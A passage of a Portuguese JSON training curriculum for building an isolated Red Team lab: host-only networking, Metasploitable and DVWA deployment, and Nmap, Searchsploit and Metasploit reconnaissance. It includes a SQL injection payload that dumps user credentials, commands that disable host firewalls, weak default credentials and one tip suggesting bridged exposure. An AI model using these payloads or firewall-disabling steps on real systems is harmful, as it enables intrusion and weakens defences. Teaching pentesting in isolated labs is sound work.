                                "Teste de isolamento: VM sem acesso à internet/host externa.",
                                "Ping interno entre VMs no mesmo adaptador funciona (se Host-Only).",
                                "Nenhum alerta de firewall/antivírus bloqueando hypervisor."
                              ],
                              "assessmentCriteria": [
                                "Instalação completa sem erros residuais.",
                                "Configuração de rede exata (Host-Only/Internal, sem NAT/Bridge).",
                                "VM operacional e isolada comprovadamente.",
                                "Tempo total dentro de 1h30min.",
                                "Documentação de IPs/configs salva.",
                                "Uso correto de verificações de hash e privilégios."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Compreensão de subnets, DHCP e isolamento.",
                                "Sistemas Operacionais: Gerenciamento de drivers e SO guests.",
                                "Programação: Automatização via VBoxManage ou PowerCLI scripts.",
                                "Segurança: Conceitos de sandboxing e contenção de ameaças.",
                                "Hardware: Compatibilidade com VT-x/AMD-V virtualização."
                              ],
                              "realWorldApplication": "Em operações de Red Team, isola VMs vulneráveis para simular ataques sem risco à rede corporativa ou internet, permitindo testes de exploits como EternalBlue em ambiente controlado para CTFs, pentests ou treinamentos de defesa cibernética."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.7.3.1.3"
                            ]
                          },
                          {
                            "id": "10.1.7.3.2.2",
                            "name": "Configurar rede segura para testes",
                            "description": "Criar rede virtual isolada, atribuir IPs estáticos (ex: 192.168.56.0/24), desabilitar NAT/firewall do host para permitir pivoting, e testar conectividade ping entre host e VMs.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Criar rede virtual isolada (Host-Only Adapter)",
                                  "subSteps": [
                                    "Abra o VirtualBox e acesse File > Host Network Manager.",
                                    "Clique em 'Create' para criar uma nova rede Host-Only (ex: vboxnet0).",
                                    "Configure IPv4 Address como 192.168.56.1/24 e habilite DHCP se necessário (mas desative para IPs estáticos).",
                                    "Salve as configurações e verifique se a rede aparece na lista.",
                                    "No host OS, habilite o adaptador de rede Host-Only nas configurações de rede."
                                  ],
                                  "verification": "Verifique no Host Network Manager se a rede vboxnet0 está ativa com o IP 192.168.56.1 atribuído ao host.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "VirtualBox instalado",
                                    "Privilégios de administrador no host OS"
                                  ],
                                  "tips": "Use uma sub-rede não conflituosa como 192.168.56.0/24 para evitar overlap com redes reais.",
                                  "learningObjective": "Entender como criar uma rede isolada que permite comunicação entre host e VMs sem acesso externo.",
                                  "commonMistakes": [
                                    "Não habilitar o adaptador no host OS",
                                    "Escolher sub-rede em uso pela rede real",
                                    "Esquecer de salvar configurações"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Atribuir IP estático no host machine",
                                  "subSteps": [
                                    "No Windows/Linux host, abra configurações de rede e selecione o adaptador Host-Only (vboxnet0).",
                                    "Defina IP manualmente: 192.168.56.1, Máscara 255.255.255.0, Gateway vazio (isolado).",
                                    "Desative IPv6 se presente para evitar conflitos.",
                                    "Aplique mudanças e execute 'ipconfig' (Windows) ou 'ip a' (Linux) para confirmar.",
                                    "Teste conectividade local com 'ping 192.168.56.1'."
                                  ],
                                  "verification": "Comando 'ipconfig' ou 'ifconfig/ip a' mostra IP 192.168.56.1 no adaptador Host-Only.",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "Acesso admin no host OS"
                                  ],
                                  "tips": "Anote o nome exato do adaptador para evitar erros em comandos.",
                                  "learningObjective": "Configurar rede estática no host para controle preciso em ambientes de teste.",
                                  "commonMistakes": [
                                    "Deixar DHCP ativado",
                                    "Configurar gateway desnecessário",
                                    "Não reiniciar adaptador após mudanças"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar IPs estáticos nas VMs e desabilitar NAT/Firewall",
                                  "subSteps": [
                                    "Inicie as VMs e acesse configurações de rede: defina Adapter 1 como Host-Only (vboxnet0).",
                                    "Nas VMs (ex: Ubuntu/Windows), configure IP estático: VM1=192.168.56.10/24, VM2=192.168.56.20/24.",
                                    "Desative NAT no VirtualBox (Settings > Network > Adapter 1 > Attached to: Host-only Adapter).",
                                    "No host e VMs, desabilite firewalls: Windows 'netsh advfirewall set allprofiles state off'; Linux 'ufw disable' ou 'iptables -F'.",
                                    "Reinicie redes nas VMs com 'systemctl restart networking' ou equivalente."
                                  ],
                                  "verification": "Em cada VM, 'ip a' mostra IP correto; no host, 'arp -a' lista VMs.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "VMs configuradas com VirtualBox Guest Additions",
                                    "Credenciais root/admin nas VMs"
                                  ],
                                  "tips": "Use IPs sequenciais fáceis de lembrar (.10, .20) e documente em um arquivo hosts.",
                                  "learningObjective": "Garantir isolamento total desabilitando NAT e firewalls para simular pivoting em Red Team.",
                                  "commonMistakes": [
                                    "Deixar NAT habilitado",
                                    "Firewall bloqueando ICMP",
                                    "IPs duplicados"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar conectividade e segurança da rede",
                                  "subSteps": [
                                    "Do host, ping VMs: 'ping 192.168.56.10' e 'ping 192.168.56.20'.",
                                    "Das VMs, ping host e entre si: 'ping 192.168.56.1' e 'ping 192.168.56.20'.",
                                    "Verifique isolamento: tente ping para 8.8.8.8 (deve falhar).",
                                    "Use 'nmap -sn 192.168.56.0/24' no host para scan de hosts vivos.",
                                    "Confirme ausência de vazamento com Wireshark: capture tráfego e verifique só tráfego local."
                                  ],
                                  "verification": "100% sucesso em pings internos; falha em pings externos; nmap detecta todos os hosts.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Ferramentas: ping, nmap, Wireshark instalados no host/VMs"
                                  ],
                                  "tips": "Capture pacotes com Wireshark para depuração visual de problemas.",
                                  "learningObjective": "Validar configuração para testes seguros de pivoting e ataques simulados.",
                                  "commonMistakes": [
                                    "Firewall ainda ativo bloqueando ping",
                                    "NAT residual permitindo saída",
                                    "Não testar bidirecionalidade"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab de Red Team, configure host (192.168.56.1), VM-alvo vulnerável (192.168.56.10 com Metasploitable) e VM-attacker (192.168.56.20 com Kali). Desabilite firewalls, teste ping bidirecional, então pivote do attacker para alvo via host.",
                              "finalVerifications": [
                                "Ping bem-sucedido bidirecional entre todos os hosts (host-VM1, host-VM2, VM1-VM2).",
                                "Nenhum acesso à internet (ping 8.8.8.8 falha de todos).",
                                "ARP table no host lista IPs/MACs das VMs.",
                                "Wireshark captura apenas tráfego local na sub-rede 192.168.56.0/24.",
                                "Nmap scan detecta exatamente os hosts configurados sem falsos positivos.",
                                "Reinício das VMs mantém conectividade sem reconfiguração."
                              ],
                              "assessmentCriteria": [
                                "Rede isolada sem vazamento externo (100% falha em testes de conectividade externa).",
                                "IPs estáticos corretamente atribuídos e persistentes após reboot.",
                                "Desabilitação completa de NAT e firewalls comprovada por testes.",
                                "Conectividade full-mesh (todos para todos) via ping e nmap.",
                                "Documentação clara dos IPs e comandos usados.",
                                "Tempo de configuração dentro do estimado com zero downtime."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Sub-redes, roteamento e ARP.",
                                "Sistemas Operacionais: Configuração de interfaces de rede (ipconfig/ifconfig).",
                                "Segurança da Informação: Isolamento de labs e controle de firewalls.",
                                "Virtualização: Adapters de rede em hypervisors como VirtualBox/VMware.",
                                "Ferramentas de Diagnóstico: Uso de ping, nmap e Wireshark."
                              ],
                              "realWorldApplication": "Em operações de pentest e CTF, configura labs isolados para simular ataques de pivoting em redes internas sem risco de exposição real, essencial para Red Team trainings e certificações como OSCP."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.7.3.2.1"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.7.3.3",
                        "name": "Deploy e Validação das VMs Alvo",
                        "description": "Importação, inicialização e verificação inicial das VMs para confirmar exposição de vulnerabilidades, preparando para exercícios de ataque em jogos cibernéticos.",
                        "specificSkills": [
                          {
                            "id": "10.1.7.3.3.1",
                            "name": "Importar e iniciar Metasploitable",
                            "description": "Importar OVA do Metasploitable no hypervisor, alocar 512MB RAM/1 CPU, iniciar VM, acessar via SSH/Telnet e listar serviços vulneráveis com netstat (ex: vsftpd 2.3.4 backdoor).",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Obter o arquivo OVA do Metasploitable",
                                  "subSteps": [
                                    "Acesse o repositório oficial do Metasploitable no SourceForge ou Rapid7 GitHub.",
                                    "Baixe o arquivo OVA mais recente (ex: metasploitable-linux-2.0.0.zip).",
                                    "Verifique a integridade do arquivo usando checksum SHA1 ou MD5 fornecido na documentação.",
                                    "Extraia o arquivo ZIP se necessário para obter o .ova puro.",
                                    "Armazene o arquivo em uma pasta acessível no hypervisor host."
                                  ],
                                  "verification": "Arquivo OVA baixado e checksum validado com sucesso.",
                                  "estimatedTime": "10-15 minutos",
                                  "materials": [
                                    "Conexão à internet",
                                    "Navegador web",
                                    "Ferramenta de checksum (ex: sha1sum no Linux ou CertUtil no Windows)"
                                  ],
                                  "tips": "Use mirrors confiáveis para evitar downloads corrompidos; prefira wget ou curl para automação.",
                                  "learningObjective": "Identificar e validar fontes oficiais de imagens vulneráveis para ambientes de teste seguros.",
                                  "commonMistakes": [
                                    "Baixar de fontes não oficiais (risco de malware)",
                                    "Ignorar verificação de hash",
                                    "Usar versão errada (ex: Metasploitable 3 em vez de 2 para vsftpd)"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Importar o OVA no hypervisor",
                                  "subSteps": [
                                    "Abra o hypervisor (ex: VirtualBox, VMware Workstation).",
                                    "Navegue para File > Import Appliance (VirtualBox) ou File > Open (VMware).",
                                    "Selecione o arquivo .ova baixado e revise as configurações pré-preenchidas.",
                                    "Ajuste rede para NAT ou Host-Only Adapter se necessário para isolamento.",
                                    "Clique em Import e aguarde a conclusão sem erros."
                                  ],
                                  "verification": "VM 'Metasploitable' aparece na lista de máquinas virtuais do hypervisor.",
                                  "estimatedTime": "5-10 minutos",
                                  "materials": [
                                    "Hypervisor instalado (VirtualBox ou VMware recomendado)"
                                  ],
                                  "tips": "Desative snapshots automáticos durante importação para economizar espaço.",
                                  "learningObjective": "Dominar o processo de importação de appliances OVA para deploy rápido de ambientes de teste.",
                                  "commonMistakes": [
                                    "Selecionar rede Bridged sem isolamento (exposição à rede real)",
                                    "Ignorar avisos de compatibilidade de hypervisor",
                                    "Importar múltiplas vezes criando duplicatas"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar e iniciar a VM",
                                  "subSteps": [
                                    "Selecione a VM Metasploitable e edite configurações (Settings > System).",
                                    "Defina RAM para 512MB e CPU para 1 núcleo.",
                                    "Verifique disco e rede (use Host-Only para segurança).",
                                    "Salve configurações e clique em Start para inicializar a VM.",
                                    "Aguarde boot completo (login padrão: msfadmin/msfadmin)."
                                  ],
                                  "verification": "VM inicia sem erros de crash e console mostra prompt de login.",
                                  "estimatedTime": "5 minutos",
                                  "materials": [
                                    "Hypervisor com VM importada"
                                  ],
                                  "tips": "Monitore uso de recursos no host para evitar sobrecarga durante testes.",
                                  "learningObjective": "Configurar recursos mínimos otimizados para VMs vulneráveis em cenários de simulação.",
                                  "commonMistakes": [
                                    "Alocar RAM/CPU excessivos (desperdício)",
                                    "Usar rede pública sem firewall",
                                    "Não salvar configurações antes de iniciar"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Acessar VM e listar serviços vulneráveis",
                                  "subSteps": [
                                    "No host, identifique IP da VM via ifconfig dentro da VM ou hypervisor logs.",
                                    "Teste conectividade: ping <IP_VM>.",
                                    "Acesse via SSH: ssh msfadmin@<IP_VM> (senha: msfadmin) ou Telnet porta 23.",
                                    "Execute netstat -tuln para listar serviços (procure vsftpd 2.3.4 na porta 21).",
                                    "Documente serviços vulneráveis encontrados (ex: Samba, Apache)."
                                  ],
                                  "verification": "netstat mostra vsftpd 2.3.4 e outros serviços; SSH/Telnet funcionam.",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "Cliente SSH/Telnet (PuTTY ou terminal nativo)",
                                    "IP da VM"
                                  ],
                                  "tips": "Use -p para portas específicas em netstat; capture screenshot para relatório.",
                                  "learningObjective": "Validar exposição de vulnerabilidades conhecidas para setup de alvos Red Team.",
                                  "commonMistakes": [
                                    "Esquecer senha padrão",
                                    "netstat sem sudo (serviços root ocultos)",
                                    "Acessar sem isolar rede"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um laboratório de pentest, baixe Metasploitable 2 OVA, importe no VirtualBox com 512MB RAM/1 CPU, inicie, SSH para 192.168.56.101 (msfadmin/msfadmin), execute netstat -tuln e confirme vsftpd 2.3.4:21 para explorar backdoor.",
                              "finalVerifications": [
                                "VM roda estável com configurações exatas (512MB RAM, 1 CPU).",
                                "SSH e Telnet acessíveis sem timeouts.",
                                "netstat lista vsftpd 2.3.4 e pelo menos 5 serviços vulneráveis.",
                                "Nenhuma falha de importação ou boot.",
                                "IP da VM alcançável do host.",
                                "Documentação de serviços salva em arquivo texto."
                              ],
                              "assessmentCriteria": [
                                "Precisão na alocação de recursos (RAM/CPU exatos).",
                                "Validação correta de serviços via netstat (identificação de vsftpd).",
                                "Segurança na rede (uso de Host-Only ou NAT).",
                                "Tempo total dentro de 40 minutos.",
                                "Ausência de erros comuns documentados.",
                                "Relatório com screenshots de verificações."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Compreensão de portas, protocolos (SSH, Telnet, FTP).",
                                "Sistemas Operacionais: Gerenciamento de VMs Linux e comandos shell.",
                                "Programação: Scripts de automação para netstat e verificações.",
                                "Segurança: Conceitos de isolamento e vulnerabilidades conhecidas (CVEs).",
                                "Infraestrutura: Virtualização e hypervisors."
                              ],
                              "realWorldApplication": "Em operações de Red Team ou CTF, configurar rapidamente Metasploitable como alvo para treinar exploits reais, como backdoor vsftpd, simulando infraestruturas legadas vulneráveis em avaliações de penetração corporativas."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.7.3.2.2"
                            ]
                          },
                          {
                            "id": "10.1.7.3.3.2",
                            "name": "Deploy de DVWA em VM ou container",
                            "description": "Instalar DVWA via Docker ou VM LAMP stack, configurar banco MySQL com usuário vulnerável, acessar http://IP/dvwa, setar security level 'low' e testar injeções básicas.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o ambiente com Docker e Docker Compose",
                                  "subSteps": [
                                    "Verifique se Docker está instalado executando 'docker --version'.",
                                    "Instale Docker se necessário: no Linux use 'sudo apt install docker.io'; no Windows/Mac baixe do site oficial.",
                                    "Instale Docker Compose: 'sudo apt install docker-compose' ou baixe o binário.",
                                    "Inicie o serviço Docker: 'sudo systemctl start docker' e adicione usuário ao grupo docker.",
                                    "Crie um diretório de trabalho: 'mkdir dvwa-deploy && cd dvwa-deploy'."
                                  ],
                                  "verification": "Execute 'docker --version' e 'docker-compose --version' sem erros.",
                                  "estimatedTime": "10 minutes",
                                  "materials": [
                                    "Máquina com Linux/Windows/Mac",
                                    "Acesso root/sudo",
                                    "Conexão internet"
                                  ],
                                  "tips": "Use Docker Desktop no Windows/Mac para simplicidade. Evite conflitos de portas rodando em máquina dedicada.",
                                  "learningObjective": "Configurar ferramentas de containerização essenciais para deploys rápidos de ambientes vulneráveis.",
                                  "commonMistakes": [
                                    "Não adicionar usuário ao grupo docker, causando erros de permissão.",
                                    "Esquecer de iniciar o serviço Docker.",
                                    "Usar versões antigas incompatíveis."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Criar arquivo docker-compose.yml para DVWA e MySQL",
                                  "subSteps": [
                                    "Crie um arquivo docker-compose.yml com conteúdo: version: '3', services: db (image: mysql:5.7, environment: MYSQL_ROOT_PASSWORD: password, MYSQL_DATABASE: dvwa, MYSQL_USER: dvwa, MYSQL_PASSWORD: p@ssw0rd), web (image: vulnerables/web-dvwa, ports: - '80:80', depends_on: - db, environment: DB_HOST: db, DB_NAME: dvwa, DB_USER: dvwa, DB_PASS: p@ssw0rd).",
                                    "Salve o arquivo no diretório de trabalho.",
                                    "Valide o YAML: 'docker-compose config'.",
                                    "Ajuste senhas para serem vulneráveis (ex: root/root, dvwa/dvwa).",
                                    "Certifique-se de que portas 80 e 3306 não estão em uso."
                                  ],
                                  "verification": "docker-compose config retorna o YAML sem erros de sintaxe.",
                                  "estimatedTime": "5 minutes",
                                  "materials": [
                                    "Editor de texto (nano/vim/VSCode)",
                                    "Documentação DVWA Docker Hub"
                                  ],
                                  "tips": "Copie templates prontos do GitHub oficial DVWA para evitar erros. Use senhas fracas intencionalmente para simular vulnerabilidades.",
                                  "learningObjective": "Entender configuração de stacks LAMP via containers com dependências entre serviços.",
                                  "commonMistakes": [
                                    "Erro de indentação no YAML.",
                                    "Portas conflitantes.",
                                    "Credenciais DB incorretas no environment."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Executar os containers DVWA e MySQL",
                                  "subSteps": [
                                    "No diretório, execute 'docker-compose up -d' para rodar em background.",
                                    "Verifique status: 'docker-compose ps' deve mostrar db e web como Up.",
                                    "Aguarde inicialização: 'docker-compose logs web' e 'docker-compose logs db'.",
                                    "Teste conectividade DB: 'docker exec -it <db_container> mysql -u dvwa -p p@ssw0rd dvwa'.",
                                    "Confirme que volumes persistem dados se necessário."
                                  ],
                                  "verification": "docker-compose ps mostra ambos containers rodando sem restarts.",
                                  "estimatedTime": "5 minutes",
                                  "materials": [
                                    "Terminal com Docker rodando"
                                  ],
                                  "tips": "Use -d para detached mode. Monitore logs em tempo real com 'docker-compose up'.",
                                  "learningObjective": "Gerenciar orquestração de múltiplos containers para ambientes completos.",
                                  "commonMistakes": [
                                    "Executar sem -d e travar terminal.",
                                    "Ignorar logs de erro de inicialização DB.",
                                    "Containers em loop de restart por DB não pronto."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Configurar DVWA e acessar a interface",
                                  "subSteps": [
                                    "Acesse http://localhost ou http://IP_da_maquina/dvwa no navegador.",
                                    "Clique em 'Create / Reset Database' para inicializar schema.",
                                    "Faça login com admin/password.",
                                    "Vá para DVWA Security e setar para 'low'.",
                                    "Logout e teste navegação em SQL Injection menu."
                                  ],
                                  "verification": "Página DVWA carrega, DB criada com sucesso, security level muda para low.",
                                  "estimatedTime": "5 minutes",
                                  "materials": [
                                    "Navegador web",
                                    "IP acessível da VM/container host"
                                  ],
                                  "tips": "Se VM, use bridge network para IP público. Firewall permita porta 80.",
                                  "learningObjective": "Finalizar setup de aplicação web vulnerável e validar acessibilidade.",
                                  "commonMistakes": [
                                    "Acessar antes do DB inicializar.",
                                    "Esquecer de resetar DB.",
                                    "Firewall bloqueando porta."
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Validar com teste de injeção SQL básica",
                                  "subSteps": [
                                    "Navegue para DVWA > SQL Injection (User ID).",
                                    "Insira '1' e veja resultado normal.",
                                    "Insira '1' UNION SELECT username, password FROM users -- e veja dump de credenciais.",
                                    "Teste em outros campos como Generic Query.",
                                    "Documente o sucesso em relatório ou screenshot."
                                  ],
                                  "verification": "Injeção SQL bem-sucedida retorna dados do banco (ex: admin/pa$$word).",
                                  "estimatedTime": "5 minutes",
                                  "materials": [
                                    "Navegador",
                                    "Conhecimento básico SQLi payloads"
                                  ],
                                  "tips": "Security deve estar low para bypass. Use Burp Suite para payloads avançados futuramente.",
                                  "learningObjective": "Confirmar vulnerabilidade operacional do target para Red Team exercises.",
                                  "commonMistakes": [
                                    "Security não em low.",
                                    "Payloads com aspas erradas.",
                                    "Não usar -- para comentar."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um laboratório Red Team, deploy DVWA via Docker em uma VM Ubuntu no VirtualBox (IP 192.168.56.10), configure MySQL com user dvwa/p@ssw0rd, acesse http://192.168.56.10/dvwa, set low security e injete '1 UNION SELECT 1,2,3--' para validar SQLi.",
                              "finalVerifications": [
                                "Containers DVWA e MySQL rodando sem erros (docker-compose ps).",
                                "DVWA acessível em http://IP/dvwa com login admin/password.",
                                "Database criada e populada após reset.",
                                "Security level configurado para 'low' persistentemente.",
                                "SQL Injection básica retorna dados do banco (ex: usernames).",
                                "Ambiente isolado, sem vazamento para rede externa."
                              ],
                              "assessmentCriteria": [
                                "Deploy completo em menos de 30 minutos.",
                                "Zero erros críticos em logs de containers.",
                                "Todas verificações finais passam sem intervenção manual.",
                                "Configurações vulneráveis intencionais (senhas fracas, low security).",
                                "Documentação de IP, credenciais e payloads de teste.",
                                "Ambiente reproduzível via docker-compose.yml compartilhado."
                              ],
                              "crossCurricularConnections": [
                                "Administração de Sistemas: Gerenciamento de containers e orquestração.",
                                "Banco de Dados: Configuração MySQL e queries vulneráveis.",
                                "Desenvolvimento Web: Stack LAMP/PHP e OWASP Top 10.",
                                "Redes: Exposição de portas e networking Docker.",
                                "Testes de Penetração: Validação de exploits SQLi."
                              ],
                              "realWorldApplication": "Red Teams usam DVWA em CTFs, treinamentos e simulações de ataques para praticar SQLi, XSS e outras vulnerabilidades web em ambientes controlados, preparando para pentests reais em aplicações corporativas."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.7.3.3.1"
                            ]
                          },
                          {
                            "id": "10.1.7.3.3.3",
                            "name": "Validar vulnerabilidades com scans iniciais",
                            "description": "Usar Nmap para escanear portas abertas (nmap -sV -O IP), confirmar exploits com Searchsploit/Metasploit (ex: msfconsole use exploit/unix/ftp/vsftpd_234_backdoor), sem executar ataques.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar ambiente e executar scan Nmap inicial",
                                  "subSteps": [
                                    "Instale ou verifique a instalação do Nmap na máquina de ataque (ex: Kali Linux).",
                                    "Identifique o IP da VM alvo vulnerável usando comandos como 'ifconfig' ou 'ip a' na VM e anote-o.",
                                    "Execute o comando Nmap básico: 'nmap -sV -O <IP>' para detectar portas abertas, versões de serviços e OS.",
                                    "Salve o output em um arquivo: 'nmap -sV -O <IP> -oN scan_results.txt'.",
                                    "Revise o output inicial para portas comuns como 21 (FTP), 22 (SSH), etc."
                                  ],
                                  "verification": "Arquivo scan_results.txt gerado com portas abertas listadas e sem erros de sintaxe no comando.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Máquina Kali Linux com Nmap instalado",
                                    "IP da VM alvo acessível na mesma rede",
                                    "Terminal"
                                  ],
                                  "tips": "Use --top-ports 100 se a VM tiver muitas portas para acelerar o scan.",
                                  "learningObjective": "Dominar a execução de scans Nmap para detecção inicial de portas e serviços.",
                                  "commonMistakes": [
                                    "Esquecer de especificar -sV para detecção de versão",
                                    "Usar IP incorreto levando a 'host down'",
                                    "Não salvar output para análise posterior"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar resultados do scan Nmap",
                                  "subSteps": [
                                    "Abra o arquivo scan_results.txt e identifique portas abertas (estado: open).",
                                    "Anote serviços e versões detectadas (ex: 21/tcp open ftp vsftpd 2.3.4).",
                                    "Verifique detecção de OS (ex: Linux 2.6.x).",
                                    "Classifique vulnerabilidades potenciais baseadas em versões conhecidas (pesquisa rápida no Google se necessário, mas sem exploits ainda).",
                                    "Documente achados em um relatório simples (ex: tabela com porta, serviço, versão)."
                                  ],
                                  "verification": "Relatório com lista de portas abertas, serviços e versões criado e sem inconsistências.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Arquivo scan_results.txt",
                                    "Editor de texto como nano ou VS Code",
                                    "Planilha ou documento para relatório"
                                  ],
                                  "tips": "Foquem em serviços antigos como vsftpd 2.3.4, conhecidos por backdoors.",
                                  "learningObjective": "Interpretar outputs Nmap para identificar alvos prioritários de vulnerabilidades.",
                                  "commonMistakes": [
                                    "Ignorar portas filtered como potenciais",
                                    "Confundir estado open com filtered",
                                    "Não anotar versões exatas de serviços"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Pesquisar exploits com Searchsploit",
                                  "subSteps": [
                                    "Instale/atualize Searchsploit se necessário: 'searchsploit -u'.",
                                    "Busque por exploits baseados nos serviços identificados: 'searchsploit vsftpd 2.3.4'.",
                                    "Liste resultados relevantes (ex: exploit/unix/ftp/vsftpd_234_backdoor).",
                                    "Leia descrições dos exploits para confirmar match com versão detectada.",
                                    "Copie caminhos dos exploits para uso posterior no Metasploit."
                                  ],
                                  "verification": "Lista de 1-3 exploits relevantes encontrados e documentados com descrições.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Kali Linux com Exploit-DB/Searchsploit",
                                    "Resultados do Nmap para queries"
                                  ],
                                  "tips": "Use 'searchsploit -w <nome>' para ver exploits em HTML detalhado.",
                                  "learningObjective": "Utilizar Searchsploit para mapear exploits conhecidos a serviços vulneráveis.",
                                  "commonMistakes": [
                                    "Não atualizar banco de dados levando a resultados desatualizados",
                                    "Queries muito genéricas gerando muitos falsos positivos",
                                    "Ignorar exploits shellcode-only"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Confirmar exploits no Metasploit sem execução",
                                  "subSteps": [
                                    "Inicie Metasploit: 'msfconsole'.",
                                    "Pesquise módulos: 'search vsftpd' ou 'search type:exploit vsftpd_234'.",
                                    "Selecione módulo: 'use exploit/unix/ftp/vsftpd_234_backdoor'.",
                                    "Verifique configurações: 'show options' e confira RHOSTS com IP da VM.",
                                    "Revise info: 'info' para descrição, targets e requisitos, sem 'exploit' ou 'run'."
                                  ],
                                  "verification": "Módulo carregado no Metasploit com opções corretas visualizadas e sem execução de ataque.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Metasploit Framework instalado",
                                    "IP da VM alvo",
                                    "Resultados de Searchsploit"
                                  ],
                                  "tips": "Sempre use 'show targets' para confirmar compatibilidade com OS detectado pelo Nmap.",
                                  "learningObjective": "Navegar Metasploit para validar existência de exploits sem risco de execução acidental.",
                                  "commonMistakes": [
                                    "Executar 'exploit' acidentalmente",
                                    "Não setar RHOSTS corretamente",
                                    "Confundir auxiliary com exploits"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma VM Kali atacando uma VM Ubuntu com vsftpd 2.3.4 na porta 21: nmap -sV -O 192.168.1.100 revela '21/tcp open ftp vsftpd 2.3.4'. Searchsploit encontra 'vsftpd_234_backdoor', e msfconsole 'use exploit/unix/ftp/vsftpd_234_backdoor' com 'show options' confirma compatibilidade sem run.",
                              "finalVerifications": [
                                "Todas portas abertas e serviços identificados corretamente via Nmap.",
                                "Pelo menos um exploit relevante encontrado via Searchsploit para serviços detectados.",
                                "Módulo Metasploit carregado com RHOSTS setado e info revisada sem execução.",
                                "Relatório consolidado com achados de scans e potenciais vulnerabilidades.",
                                "Nenhum ataque executado (sem shells ou payloads rodando na VM alvo)."
                              ],
                              "assessmentCriteria": [
                                "Precisão na execução de comandos Nmap (sem erros de sintaxe).",
                                "Análise correta de outputs identificando versões vulneráveis.",
                                "Eficiência na busca de exploits (relevantes e confirmados).",
                                "Manipulação segura do Metasploit (verificação sem exploração).",
                                "Documentação completa e organizada dos passos.",
                                "Tempo total dentro do estimado (70-80 minutos)."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Entendimento de portas, protocolos TCP/UDP e detecção OS.",
                                "Sistemas Operacionais: Conhecimento de serviços Linux como FTP/SSH e suas versões.",
                                "Programação: Scripts para automação de scans (ex: Bash com Nmap).",
                                "Ética e Direito: Regras de engajamento em pentests (sem execução sem autorização)."
                              ],
                              "realWorldApplication": "Em operações de Red Team ou pentests certificados, validar vulnerabilidades iniciais garante priorização de alvos reais sem risco desnecessário, como em auditorias de conformidade OWASP ou NIST para empresas financeiras."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.7.3.3.2"
                            ]
                          },
                          {
                            "id": "10.1.7.3.3.4",
                            "name": "Documentar ambiente para Red Team",
                            "description": "Registrar IPs, serviços, vulns em relatório (IPs, open ports, CVEs), snapshots das VMs e regras de engajamento para uso em jogos cibernéticos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Inventariar Ativos de Rede e IPs das VMs Alvo",
                                  "subSteps": [
                                    "Execute comandos como 'nmap -sn 192.168.1.0/24' para descobrir hosts ativos.",
                                    "Registre todos os IPs descobertos em uma planilha ou ferramenta como Excel/Google Sheets.",
                                    "Anote o hostname, MAC address e tipo de SO se possível via nmap ou arp-scan.",
                                    "Crie uma seção 'Inventário de Ativos' no relatório inicial.",
                                    "Valide conectividade com ping para cada IP listado."
                                  ],
                                  "verification": "Lista completa de IPs ativos com ping bem-sucedido para todos.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Nmap instalado",
                                    "Planilha (Excel ou similar)",
                                    "Acesso à rede do lab"
                                  ],
                                  "tips": "Use --reason no nmap para detalhes extras sobre hosts up/down.",
                                  "learningObjective": "Identificar e catalogar todos os ativos de rede no ambiente de teste.",
                                  "commonMistakes": [
                                    "Esquecer sub-redes",
                                    "Não validar conectividade",
                                    "IPs duplicados na lista"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Documentar Serviços e Portas Abertas",
                                  "subSteps": [
                                    "Execute 'nmap -sV -p- <IP>' para escanear portas e versões de serviços em cada VM.",
                                    "Registre portas abertas, serviços (ex: SSH v2.0, Apache 2.4) e banners.",
                                    "Classifique portas como TCP/UDP e anote estado (open, filtered).",
